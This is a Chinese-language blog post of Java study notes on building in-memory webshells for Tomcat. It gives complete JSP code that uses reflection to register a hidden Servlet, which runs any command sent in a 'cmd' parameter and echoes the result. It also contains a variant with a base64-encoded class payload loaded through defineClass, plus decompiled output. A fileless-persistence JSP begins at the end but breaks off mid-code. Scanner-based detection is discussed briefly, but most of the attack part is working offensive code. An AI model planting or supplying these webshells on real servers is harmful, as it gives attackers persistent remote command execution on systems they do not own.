<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>AmiaaaZ's Site | Java学习笔记Ⅴ</title><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=generator content="Hugo 0.100.1"><meta name=ROBOTS content="INDEX, FOLLOW"><link href=/dist/app.css rel=stylesheet><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-203328343-1','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script>
<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous><script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><script>(function(i,t){var n=document,s='script',e=n.createElement(s),o=n.getElementsByTagName(s)[0];e.src=i,t&&e.addEventListener('load',function(e){t(e)}),o.parentNode.insertBefore(e,o)})('https://amiaaaz.github.io/lib/pangu.min.js',function(){pangu.spacingPage()})</script><style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style></head><body class="bg-gray-100 text-gray-700 font-sans"><div class="p-6 sm:p-10 md:p-16 flex flex-wrap"><header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl"><div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2"><div><h2><a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a></h2></div><h1 class=pt-2>Java学习笔记Ⅴ</h1><h3 class="text-java-700 font-normal leading-relaxed pt-2">webshell&内存马踩坑不完全指北（上）</h3><div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light"><a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/notessummary>NOTES&SUMMARY</a>
&nbsp;&nbsp;
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/java>Java</a></div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2022-05-30T23:20:41+08:00>2022-5-30 23:20</time></div><details class=toc open><summary><hr></summary><div class="inline toc-content"><nav id=TableOfContents><ul><li><a href=#jsp文件落地>jsp&文件落地</a><ul><li><a href=#虚假的jsp>虚假的jsp</a></li><li><a href=#字节码jsp>字节码jsp</a></li><li><a href=#金蝉脱壳的jsp>金蝉脱壳的jsp</a></li></ul></li><li><a href=#反序列化>反序列化</a><ul><li><a href=#接入冰蝎>接入冰蝎</a></li><li><a href=#接入哥斯拉>接入哥斯拉</a></li></ul></li></ul></nav></div></details><hr></div></header><main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4"><article><section class="mx-auto content"><div class=c-rich-text><p>各路博客没少看，踩的坑怎么还超级多呢……所有参考链接附在文末</p><hr><blockquote><p>本文涉及到的Java环境&相关依赖，仅供参考：</p><p>Java 1.8.0_311 (8u311)</p><p>tomcat-embed-core 8.5.73, tomcat-embed-jasper 8.5.73</p><p>commons-collections 3.2.1</p><p>javassist 3.20.0-GA</p></blockquote><h2 id=jsp文件落地>jsp&文件落地</h2><p>可能很多人会觉得：都内存马了怎么还能文件落地？？？</p><p>有一说一，确实，但逻辑不是这样讲的：应该是内存马可以做到文件不落地——也就是说删除上马时凭借的.java .jsp .class文件后一样可以运行于内存中并执行命令（除非单独kill），而上马的过程中根据使用手段的不同会产生一定程度的文件落地</p><p>对于jsp来说，一定会在初次请求时被tomcat自动生成对应的.java和.class文件并放在临时目录中，毕竟jsp本质就是一个Servlet；我们来看一些例子（以下均为动态注册Servlet型内存马）</p><h3 id=虚假的jsp>虚假的jsp</h3><p>代码参考自<a href=https://xz.aliyun.com/t/11003>JAVA内存马的“一生”</a></p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;
&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;
&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;
&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;
&lt;%@ page import=&#34;java.io.PrintWriter&#34; %&gt;
&lt;%@ page language=&#34;java&#34; contentType=&#34;text/html; charset=UTF-8&#34; pageEncoding=&#34;UTF-8&#34;%&gt;
&lt;%
    final String name = &#34;servletshell&#34;;
    // 获取上下文
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField(&#34;context&#34;);
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    // 注册Servlet对象 并重写service方法
    Servlet servlet = new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {

        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter(&#34;cmd&#34;);    // get传入cmd参数
            // 确定目标操作系统
            boolean isLinux = true;
            String osTyp = System.getProperty(&#34;os.name&#34;);
            if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[] {&#34;sh&#34;, &#34;-c&#34;, cmd} : new String[] {&#34;cmd.exe&#34;, &#34;/c&#34;, cmd}; // 确定命令执行的格式
            // 处理输入&amp;命令执行
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            // 回显执行结果
            Scanner s = new Scanner( in ).useDelimiter(&#34;\\a&#34;);
            String output = s.hasNext() ? s.next() : &#34;&#34;;
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {

        }
    };
    // 创建Wrapper对象来封装前面new Servlet对象
    org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper();
    newWrapper.setName(name);
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet(servlet);
    newWrapper.setServletClass(servlet.getClass().getName());
    // 为内存马添加路由映射
    standardContext.addChild(newWrapper);
    standardContext.addServletMappingDecoded(&#34;/servletmemshell&#34;,name);
    response.getWriter().write(&#34;inject success&#34;);
%&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;servletshell&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>很好理解，通过注册Servlet并重写service方法来做到命令执行+回显，访问一次这个jsp就可以添加Servlet类型内存马到/servletmemshell路径下，但我们借助<a href=https://github.com/c0ny1/java-memshell-scanner>java-memshell-scanner</a>就可以发现事情没我们想的那么完美</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531001914278.png alt=image-20220531001914278></p><p>把它dump下来</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e>// Source code recreated from a .class file by IntelliJ IDEA
</span></span></span><span style=display:flex><span><span style=color:#75715e>// (powered by FernFlower decompiler)
</span></span></span><span style=display:flex><span><span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>org.apache.jsp</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.IOException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.InputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.PrintWriter</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Scanner</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.Servlet</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.ServletConfig</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.ServletException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.ServletRequest</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.ServletResponse</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>test_jsp$1</span> <span style=color:#00a8c8>implements</span> <span style=color:#111>Servlet</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>test_jsp$1</span><span style=color:#f92672>(</span><span style=color:#111>test_jsp</span> <span style=color:#111>var1</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>this$0</span> <span style=color:#f92672>=</span> <span style=color:#111>var1</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>init</span><span style=color:#f92672>(</span><span style=color:#111>ServletConfig</span> <span style=color:#111>servletConfig</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>ServletException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#111>ServletConfig</span> <span style=color:#75af00>getServletConfig</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>service</span><span style=color:#f92672>(</span><span style=color:#111>ServletRequest</span> <span style=color:#111>servletRequest</span><span style=color:#f92672>,</span> <span style=color:#111>ServletResponse</span> <span style=color:#111>servletResponse</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>ServletException</span><span style=color:#f92672>,</span> <span style=color:#111>IOException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>cmd</span> <span style=color:#f92672>=</span> <span style=color:#111>servletRequest</span><span style=color:#f92672>.</span><span style=color:#75af00>getParameter</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;cmd&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>boolean</span> <span style=color:#111>isLinux</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>true</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>osTyp</span> <span style=color:#f92672>=</span> <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>getProperty</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;os.name&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>osTyp</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#111>osTyp</span><span style=color:#f92672>.</span><span style=color:#75af00>toLowerCase</span><span style=color:#f92672>().</span><span style=color:#75af00>contains</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;win&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>isLinux</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>false</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>cmds</span> <span style=color:#f92672>=</span> <span style=color:#111>isLinux</span> <span style=color:#f92672>?</span> <span style=color:#00a8c8>new</span> <span style=color:#111>String</span><span style=color:#f92672>[]{</span><span style=color:#d88200>&#34;sh&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;-c&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>cmd</span><span style=color:#f92672>}</span> <span style=color:#f92672>:</span> <span style=color:#00a8c8>new</span> <span style=color:#111>String</span><span style=color:#f92672>[]{</span><span style=color:#d88200>&#34;cmd.exe&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;/c&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>cmd</span><span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>        <span style=color:#111>InputStream</span> <span style=color:#111>in</span> <span style=color:#f92672>=</span> <span style=color:#111>Runtime</span><span style=color:#f92672>.</span><span style=color:#75af00>getRuntime</span><span style=color:#f92672>().</span><span style=color:#75af00>exec</span><span style=color:#f92672>(</span><span style=color:#111>cmds</span><span style=color:#f92672>).</span><span style=color:#75af00>getInputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Scanner</span> <span style=color:#111>s</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>Scanner</span><span style=color:#f92672>(</span><span style=color:#111>in</span><span style=color:#f92672>)).</span><span style=color:#75af00>useDelimiter</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;\\a&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>output</span> <span style=color:#f92672>=</span> <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#75af00>hasNext</span><span style=color:#f92672>()</span> <span style=color:#f92672>?</span> <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#75af00>next</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> <span style=color:#d88200>&#34;&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>PrintWriter</span> <span style=color:#111>out</span> <span style=color:#f92672>=</span> <span style=color:#111>servletResponse</span><span style=color:#f92672>.</span><span style=color:#75af00>getWriter</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#111>output</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>out</span><span style=color:#f92672>.</span><span style=color:#75af00>flush</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>out</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#111>String</span> <span style=color:#75af00>getServletInfo</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>destroy</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>可以说所谓的“内存马”显露无疑，被看的干干净净</p><p>究其原因并不复杂，这里dump下来的<code>test_jsp$1.class</code>文件就是jsp马中<code>Servlet servlet = new Servlet(){}</code>的部分，它实现了servletshell的主要功能；而因为Servlet直接被注册到当前上下文中了，所以当我们手动删除这个jsp和附带的所有.class文件后会发现/servletshell路径下的内存马依旧可以照常工作，memshell scanner会这样显示</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531004046566.png alt=image-20220531004046566></p><p>真 · 内存马，不过只要使用memshell scanner的kill功能（从上下文中解绑Servlet）即可杀掉这个马，并且由于此前删掉了上马所用的.jsp文件，所以做到了彻底清除servletshell</p><h3 id=字节码jsp>字节码jsp</h3><p>可能有师傅能看出问题所在：这就离谱，你内存马都不用个字节码加载 这肯定会连着jsp文件一起被编译啊？？？</p><p>有一说一，确实，那我们把上面的在jsp内直接new Servlet的做法换做字节码的形式</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;
&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
&lt;%@ page language=&#34;java&#34; contentType=&#34;text/html; charset=UTF-8&#34; pageEncoding=&#34;UTF-8&#34;%&gt;
&lt;%
    String classCode = &#34;yv66vgAAADQAkQoAHQBNCAA0CwBOAE8IAFAKAFEAUgoACQBTCABUCgAJAFUHAFYIAFcIAFgIAFkIAFoKAFsAXAoAWwBdCgBeAF8HAGAKABEAYQgAYgoAEQBjCgARAGQKABEAZQgAZgsAZwBoCgBpAGoKAGkAawoAaQBsBwBtBwBuBwBvAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1MU2VydmxldFRlc3Q7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAcAEAEGdldFNlcnZsZXRDb25maWcBAB8oKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdpc0xpbnV4AQABWgEABW9zVHlwAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQANU3RhY2tNYXBUYWJsZQcAVgcAOgcAcQcAYAcAcgEADmdldFNlcnZsZXRJbmZvAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAEFNlcnZsZXRUZXN0LmphdmEMAB8AIAcAcwwAdAB1AQAHb3MubmFtZQcAdgwAdwB1DAB4AEkBAAN3aW4MAHkAegEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwB7DAB8AH0MAH4AfwcAgAwAgQCCAQARamF2YS91dGlsL1NjYW5uZXIMAB8AgwEAAlxhDACEAIUMAIYAhwwAiABJAQAABwCJDACKAIsHAIwMAI0AjgwAjwAgDACQACABAAtTZXJ2bGV0VGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAVjbG9zZQAhABwAHQABAB4AAAAGAAEAHwAgAAEAIQAAADMAAQABAAAABSq3AAGxAAAAAgAiAAAACgACAAAACgAEAAsAIwAAAAwAAQAAAAUAJAAlAAAAAQAmACcAAgAhAAAANQAAAAIAAAABsQAAAAIAIgAAAAYAAQAAAA4AIwAAABYAAgAAAAEAJAAlAAAAAAABACgAKQABACoAAAAEAAEAKwABACwALQABACEAAAAsAAEAAQAAAAIBsAAAAAIAIgAAAAYAAQAAABEAIwAAAAwAAQAAAAIAJAAlAAAAAQAuAC8AAgAhAAABigAEAAsAAAChKxICuQADAgBOBDYEEgS4AAU6BRkFxgATGQW2AAYSB7YACJkABgM2BBUEmQAYBr0ACVkDEgpTWQQSC1NZBS1TpwAVBr0ACVkDEgxTWQQSDVNZBS1TOga4AA4ZBrYAD7YAEDoHuwARWRkHtwASEhO2ABQ6CBkItgAVmQALGQi2ABanAAUSFzoJLLkAGAEAOgoZChkJtgAZGQq2ABoZCrYAG7EAAAADACIAAAA6AA4AAAAVAAkAFwAMABgAEwAZACUAGgAoABwAVgAeAGMAIABzACEAhwAiAI8AIwCWACQAmwAlAKAAJgAjAAAAcAALAAAAoQAkACUAAAAAAKEAMAAxAAEAAAChADIAMwACAAkAmAA0ADUAAwAMAJUANgA3AAQAEwCOADgANQAFAFYASwA5ADoABgBjAD4AOwA8AAcAcwAuAD0APgAIAIcAGgA/ADUACQCPABIAQABBAAoAQgAAACEABf4AKAcAQwEHAEMZUQcARP4ALgcARAcARQcARkEHAEMAKgAAAAYAAgArAEcAAQBIAEkAAQAhAAAALAABAAEAAAACAbAAAAACACIAAAAGAAEAAAApACMAAAAMAAEAAAACACQAJQAAAAEASgAgAAEAIQAAACsAAAABAAAAAbEAAAACACIAAAAGAAEAAAAtACMAAAAMAAEAAAABACQAJQAAAAEASwAAAAIATA==&#34;;
    // 获取上下文
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField(&#34;context&#34;);
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
    java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod(&#34;defineClass&#34;, byte[].class, int.class, int.class);
    defineClass.setAccessible(true);
    byte[] evil = java.util.Base64.getDecoder().decode(classCode);
    Class&lt;?&gt; servletClass = (Class&lt;?&gt;) defineClass.invoke(classLoader, evil, 0, evil.length);

    final String name = &#34;servletshell&#34;;
    // 使用 Wrapper 封装 Servlet
    org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper();
    newWrapper.setName(name);
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet((Servlet) servletClass.newInstance());
    newWrapper.setServletClass(servletClass.getName());
    // 为内存马添加路由映射
    standardContext.addChild(newWrapper);
    standardContext.addServletMappingDecoded(&#34;/servletmemshell&#34;,name);
    response.getWriter().write(&#34;inject success&#34;);
%&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;servletshell&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531183048214.png alt=image-20220531183048214></p><p>不过并没有看起来这么美好——服务器上一下子多了1个jsp 1个class 1个java</p><h3 id=金蝉脱壳的jsp>金蝉脱壳的jsp</h3><p>对于上面示范的动静较大的2种方式不能说一无是处吧，只能说是乏善可陈，而在<a href=https://www.anquanke.com/post/id/224698>Tomcat容器攻防笔记之JSP金蝉脱壳</a>这篇文章中作者提出了jsp金蝉脱壳的思路，代码如下</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;
&lt;%@ page import=&#34;org.apache.catalina.mapper.MappingData&#34; %&gt;
&lt;%@ page import=&#34;org.apache.catalina.Wrapper&#34; %&gt;
&lt;%@ page import=&#34;org.apache.jasper.compiler.JspRuntimeContext&#34; %&gt;
&lt;%@ page import=&#34;java.util.concurrent.ConcurrentHashMap&#34; %&gt;
&lt;%@ page import=&#34;org.apache.jasper.servlet.JspServletWrapper&#34; %&gt;
&lt;%@ page import=&#34;org.apache.jasper.JspCompilationContext&#34; %&gt;
&lt;%@ page import=&#34;java.io.File&#34; %&gt;
&lt;%
    //从request对象中获取request属性
    Field requestF = request.getClass().getDeclaredField(&#34;request&#34;);
    requestF.setAccessible(true);
    Request req = (Request) requestF.get(request);
    //获取MappingData
    MappingData mappingData = req.getMappingData();
    //获取StandrardWrapper
    Field wrapperF = mappingData.getClass().getDeclaredField(&#34;wrapper&#34;);
    wrapperF.setAccessible(true);
    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);
    //获取jspServlet对象
    Field instanceF = wrapper.getClass().getDeclaredField(&#34;instance&#34;);
    instanceF.setAccessible(true);
    Servlet jspServlet = (Servlet) instanceF.get(wrapper);
    //获取rctxt属性
    Field rctxt = jspServlet.getClass().getDeclaredField(&#34;rctxt&#34;);
    rctxt.setAccessible(true);
